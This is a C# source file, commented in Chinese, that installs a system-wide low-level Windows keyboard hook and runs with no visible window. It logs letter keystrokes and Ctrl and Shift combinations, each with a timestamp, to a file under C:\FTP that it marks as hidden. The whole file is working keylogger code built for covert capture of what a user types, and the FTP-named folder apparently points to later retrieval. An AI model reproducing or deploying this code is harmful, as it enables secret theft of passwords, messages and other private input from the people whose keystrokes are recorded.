using System;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Reflection;
//using System.Runtime.InteropServices;

namespace KeyboardHook
{
    //键盘钩子
    class KeyboardHook
    {
        public event KeyEventHandler KeyDownEvent;
        public event KeyPressEventHandler KeyPressEvent;
        public event KeyEventHandler KeyUpEvent;

        public delegate int HookProc(int nCode, Int32 wParam, IntPtr lParam);
        static int hKeyboardHook = 0; //声明键盘钩子处理的初始值
        //值在Microsoft SDK的Winuser.h里查询

        public const int WH_KEYBOARD_LL = 13;   //线程键盘钩子监听鼠标消息设为2，全局键盘监听鼠标消息设为13
        HookProc KeyboardHookProcedure; //声明KeyboardHookProcedure作为HookProc类型
        //键盘结构
        [StructLayout(LayoutKind.Sequential)]
        public class KeyboardHookStruct
        {
            public int vkCode;  //定一个虚拟键码。该代码必须有一个价值的范围1至254
            public int scanCode; // 指定的硬件扫描码的关键
            public int flags;  // 键标志
            public int time; // 指定的时间戳记的这个讯息
            public int dwExtraInfo; // 指定额外信息相关的信息
        }
        //使用此功能，安装了一个钩子
        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern int SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hInstance, int threadId);


        //调用此函数卸载钩子
        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern bool UnhookWindowsHookEx(int idHook);


        //使用此功能，通过信息钩子继续下一个钩子
        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        public static extern int CallNextHookEx(int idHook, int nCode, Int32 wParam, IntPtr lParam);

        // 取得当前线程编号（线程钩子需要用到）
        [DllImport("kernel32.dll")]
        static extern int GetCurrentThreadId();

        //使用WINDOWS API函数代替获取当前实例的函数,防止钩子失效
        [DllImport("kernel32.dll")]
        public static extern IntPtr GetModuleHandle(string name);

        public void Start()
        {
            // 安装键盘钩子
            if (hKeyboardHook == 0)
            {
                KeyboardHookProcedure = new HookProc(KeyboardHookProc);
                hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHookProcedure, GetModuleHandle(System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName), 0);

                if (hKeyboardHook == 0)
                {
                    Stop();
                    throw new Exception("安装键盘钩子失败");
                }
            }
        }
        public void Stop()
        {
            bool retKeyboard = true;


            if (hKeyboardHook != 0)
            {
                retKeyboard = UnhookWindowsHookEx(hKeyboardHook);
                hKeyboardHook = 0;
            }

            if (!(retKeyboard)) throw new Exception("卸载钩子失败！");
        }
        //ToAscii职能的转换指定的虚拟键码和键盘状态的相应字符或字符
        [DllImport("user32")]
        public static extern int ToAscii(int uVirtKey, //[in] 指定虚拟关键代码进行翻译。
                                         int uScanCode, // [in] 指定的硬件扫描码的关键须翻译成英文。高阶位的这个值设定的关键，如果是（不压）
                                         byte[] lpbKeyState, // [in] 指针，以256字节数组，包含当前键盘的状态。每个元素（字节）的数组包含状态的一个关键。如果高阶位的字节是一套，关键是下跌（按下）。在低比特，如果设置表明，关键是对切换。在此功能，只有肘位的CAPS LOCK键是相关的。在切换状态的NUM个锁和滚动锁定键被忽略。
                                         byte[] lpwTransKey, // [out] 指针的缓冲区收到翻译字符或字符。
                                         int fuState); // [in] Specifies whether a menu is active. This parameter must be 1 if a menu is active, or 0 otherwise.

        //获取按键的状态
        [DllImport("user32")]
        public static extern int GetKeyboardState(byte[] pbKeyState);


        [DllImport("user32.dll", CharSet = CharSet.Auto, CallingConvention = CallingConvention.StdCall)]
        private static extern short GetKeyState(int vKey);

        private const int WM_KEYDOWN = 0x100;//KEYDOWN
        private const int WM_KEYUP = 0x101;//KEYUP
        private const int WM_SYSKEYDOWN = 0x104;//SYSKEYDOWN
        private const int WM_SYSKEYUP = 0x105;//SYSKEYUP

        private int KeyboardHookProc(int nCode, Int32 wParam, IntPtr lParam)
        {
            // 侦听键盘事件
            if ((nCode >= 0) && (KeyDownEvent != null || KeyUpEvent != null || KeyPressEvent != null))
            {
                KeyboardHookStruct MyKeyboardHookStruct = (KeyboardHookStruct)Marshal.PtrToStructure(lParam, typeof(KeyboardHookStruct));
                // raise KeyDown
                if (KeyDownEvent != null && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
                {
                    Keys keyData = (Keys)MyKeyboardHookStruct.vkCode;
                    KeyEventArgs e = new KeyEventArgs(keyData);
                    KeyDownEvent(this, e);
                }
            }

            if (nCode >= 0 && wParam == WM_KEYUP)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                int Caps_Lock = GetKeyState(20);

                if (Caps_Lock == 0 && vkCode >= 65 && vkCode<=90)
                {
                    if (pause_flag >= 1)
                    {
                        pause_flag -= 1;
                        goto goto_flag;
                    }
                    char caps_flag;
                    caps_flag = (char)(vkCode + 32);
                    Normal_txt(caps_flag); 

                }
                else
                {
                    if (pause_flag >= 1)
                    {
                        pause_flag -= 1;
                        goto goto_flag;
                    }
                    Caps_txt(vkCode);
                }


            }
goto_flag:
            return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
        }
        ~KeyboardHook()
        {
            Stop();
        }

        static int pause_flag=0;
        //判断输入键值（实现KeyDown事件） 
        private void hook_KeyDown(object sender, KeyEventArgs e) 
        { 
        //判断按下的键（Ctrl + A） 
          //  if (CapsLockStatus == true)
            if (e.KeyValue >= (int)Keys.A && e.KeyValue <= (int)Keys.Z && (int)Control.ModifierKeys == (int)Keys.Control) 
             {
                 Ctrl_txt(e.KeyValue);
                 pause_flag = 2;
             }
            if (e.KeyValue >= (int)Keys.A && e.KeyValue <= (int)Keys.Z && (int)Control.ModifierKeys == (int)Keys.Shift)
            {
                Shift_txt(e.KeyValue);
                pause_flag = 2;
            } 
        }


        KeyEventHandler myKeyEventHandeler = null;//按键钩子
        public void startListen()
        {
            myKeyEventHandeler = new KeyEventHandler(hook_KeyDown);
            KeyDownEvent += myKeyEventHandeler;
        }


        public void Ctrl_txt(int txtcode)
        {
            if (!System.IO.File.Exists(@"C:\FTP\test.txt"))
            {
                //没有则创建这个文件
                FileStream fs1 = new FileStream(@"C:\FTP\test.txt", FileMode.Create, FileAccess.Write);//创建写入文件                
                System.IO.File.SetAttributes(@"C:\FTP\test.txt", FileAttributes.Hidden);//设置文件属性为隐藏
                StreamWriter sw = new StreamWriter(fs1);
                String flag_time;
                flag_time = DateTime.Now.ToLocalTime().ToString();
                sw.WriteLine("[Ctrl+" + (Keys)txtcode + "]" + flag_time);//开始写入值
                sw.Close();
                fs1.Close();
            }
            else
            {
                FileStream fs = new FileStream(@"C:\FTP\test.txt", FileMode.Append, FileAccess.Write);
                System.IO.File.SetAttributes(@"C:\FTP\test.txt", FileAttributes.Hidden);
                StreamWriter sr = new StreamWriter(fs);
                String flag_time;
                flag_time = DateTime.Now.ToLocalTime().ToString();
                sr.WriteLine("[Ctrl+" + (Keys)txtcode + "]" + flag_time);//开始写入值
                sr.Close();
                fs.Close();

            }
        }
        public void Normal_txt(int txtcode)
        {
            if (!System.IO.File.Exists(@"C:\FTP\test.txt"))
            {
                //没有则创建这个文件
                FileStream fs1 = new FileStream(@"C:\FTP\test.txt", FileMode.Create, FileAccess.Write);//创建写入文件                
                System.IO.File.SetAttributes(@"C:\FTP\test.txt", FileAttributes.Hidden);//设置文件属性为隐藏
                StreamWriter sw = new StreamWriter(fs1);
                String flag_time;
                flag_time = DateTime.Now.ToLocalTime().ToString();
                sw.WriteLine("[" + (char)txtcode + "]" + flag_time);//开始写入值
                sw.Close();
                fs1.Close();
            }
            else
            {
                FileStream fs = new FileStream(@"C:\FTP\test.txt", FileMode.Append, FileAccess.Write);
                System.IO.File.SetAttributes(@"C:\FTP\test.txt", FileAttributes.Hidden);
                StreamWriter sr = new StreamWriter(fs);
                String flag_time;
                flag_time = DateTime.Now.ToLocalTime().ToString();
                sr.WriteLine("[" + (char)txtcode + "]" + flag_time);//开始写入值
                sr.Close();
                fs.Close();

            }
        }
        public void Caps_txt(int txtcode)
        {
            if (!System.IO.File.Exists(@"C:\FTP\test.txt"))
            {
                //没有则创建这个文件
                FileStream fs1 = new FileStream(@"C:\FTP\test.txt", FileMode.Create, FileAccess.Write);//创建写入文件                
                //System.IO.File.SetAttributes(@"C:\FTP\test.txt", FileAttributes.Hidden);//设置文件属性为隐藏
                StreamWriter sw = new StreamWriter(fs1);
                String flag_time;
                flag_time = DateTime.Now.ToLocalTime().ToString();
                sw.WriteLine("[" + (Keys)txtcode + "]" + flag_time);//开始写入值
                sw.Close();
                fs1.Close();
            }
            else
            {
                FileStream fs = new FileStream(@"C:\FTP\test.txt", FileMode.Append, FileAccess.Write);
                //System.IO.File.SetAttributes(@"C:\FTP\test.txt", FileAttributes.Hidden);
                StreamWriter sr = new StreamWriter(fs);
                String flag_time;
                flag_time = DateTime.Now.ToLocalTime().ToString();
                sr.WriteLine("[" + (Keys)txtcode + "]" + flag_time);//开始写入值
                sr.Close();
                fs.Close();

            }
        }
        public void Shift_txt(int txtcode)
        {
            if (!System.IO.File.Exists(@"C:\FTP\test.txt"))
            {
                //没有则创建这个文件
                FileStream fs1 = new FileStream(@"C:\FTP\test.txt", FileMode.Create, FileAccess.Write);//创建写入文件                
                System.IO.File.SetAttributes(@"C:\FTP\test.txt", FileAttributes.Hidden);//设置文件属性为隐藏
                StreamWriter sw = new StreamWriter(fs1);
                String flag_time;
                flag_time = DateTime.Now.ToLocalTime().ToString();
                sw.WriteLine("[Shift+" + (Char)txtcode + "]" + flag_time);//开始写入值
                sw.Close();
                fs1.Close();
            }
            else
            {
                FileStream fs = new FileStream(@"C:\FTP\test.txt", FileMode.Append, FileAccess.Write);
                System.IO.File.SetAttributes(@"C:\FTP\test.txt", FileAttributes.Hidden);
                StreamWriter sr = new StreamWriter(fs);
                String flag_time;
                flag_time = DateTime.Now.ToLocalTime().ToString();
                sr.WriteLine("[Shift+" + (Char)txtcode + "]" + flag_time);//开始写入值
                sr.Close();
                fs.Close();

            }
        }

        public static void Main()
        {
            
            KeyboardHook k_hook = new KeyboardHook();
            k_hook.startListen();
            k_hook.Start();//安装键盘钩子
                      
            Application.Run();
        }


    }
}